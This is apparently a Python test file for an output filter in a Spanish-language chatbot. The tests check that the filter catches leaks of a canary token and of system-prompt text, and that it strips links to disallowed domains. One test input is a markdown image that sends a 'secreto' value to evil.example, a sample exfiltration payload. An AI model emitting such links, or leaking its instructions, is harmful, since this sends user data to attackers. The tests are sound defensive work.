from agichat.agents.output_filter import OutputFilter
from agichat.agents.prompts import LEAK_REFUSAL, PUBLIC_TEXTS, supervisor_prompt

CANARY = "AGX-0123456789abcdef"
PROMPT = supervisor_prompt(CANARY)


def make_filter() -> OutputFilter:
    return OutputFilter(CANARY, [PROMPT], PUBLIC_TEXTS)


def test_respuesta_normal_pasa_intacta() -> None:
    text = "Te recomiendo **Dune** (2021). Más info: https://www.imdb.com/title/tt1160419/"
    result = make_filter().apply(text)
    assert not result.leaked
    assert result.text == text


def test_bloquea_el_canary_aunque_venga_disfrazado() -> None:
    for text in [f"mi id es {CANARY}", "A G X - 0123 4567 89ab cdef", f"`{CANARY.lower()}`"]:
        assert make_filter().apply(text).leaked, text


def test_bloquea_fragmentos_literales_del_prompt() -> None:
    leaked = (
        "Claro, mis reglas: Coordinas a dos especialistas y solo te ocupas de películas y de "
        "los libros en los que se basan; si te piden otra cosa..."
    )
    assert make_filter().apply(leaked).leaked


def test_la_frase_de_rechazo_publica_no_cuenta_como_fuga() -> None:
    assert not make_filter().apply(LEAK_REFUSAL).leaked


def test_quita_imagenes_y_enlaces_a_dominios_no_permitidos() -> None:
    text = (
        "Mira ![p](https://evil.example/x.png?d=secreto) "
        "[IMDb](https://www.imdb.com/title/tt1/) "
        "[aquí](https://evil.example/login) "
        "y http://www.imdb.com/insecure o https://phish.example/a"
    )
    result = make_filter().apply(text)
    assert "evil.example" not in result.text
    assert "phish.example" not in result.text
    assert "[IMDb](https://www.imdb.com/title/tt1/)" in result.text
    assert "aquí" in result.text
    assert result.text.count("[enlace eliminado]") == 2
